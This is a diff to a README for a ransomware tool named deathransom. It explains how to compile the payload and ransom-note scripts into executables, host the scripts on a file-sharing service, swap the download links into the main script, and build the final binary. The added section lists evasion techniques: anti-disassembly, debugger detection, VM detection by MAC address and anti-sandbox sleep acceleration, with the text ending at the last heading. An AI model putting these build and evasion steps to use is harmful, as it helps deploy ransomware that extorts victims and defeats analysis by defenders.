@@ -18,3 +18,17 @@ Transform the time_script into exe using pyinstaller in python2 version typing `
 To transform the main of ransom request we will use the pyinstaller in the python3 version ``` pyinstaller --onefile --windowed main.py ```                                                                                                                                    
 Then uploads the scripts to any file hosting service and change the links on the line 28 and 31 in deathransom.py                        
 So just transform deathransom.py into exe using pyinstaller in python2 version and be happy :D
+
+## Bypass Technics
+
+### Anti-Disassembly
+Creates several variables to try to make disassembly difficult
+
+### Anti-Debugger
+Checks if a debugger is active using the ctypes function: windll.kernel32.IsDebuggerPresent()
+
+### Anti-Vm
+Checks if the machine's mac is the same as the standard vms mac
+
+### Anti-Sandbox
+#### Sleep-Acceleration
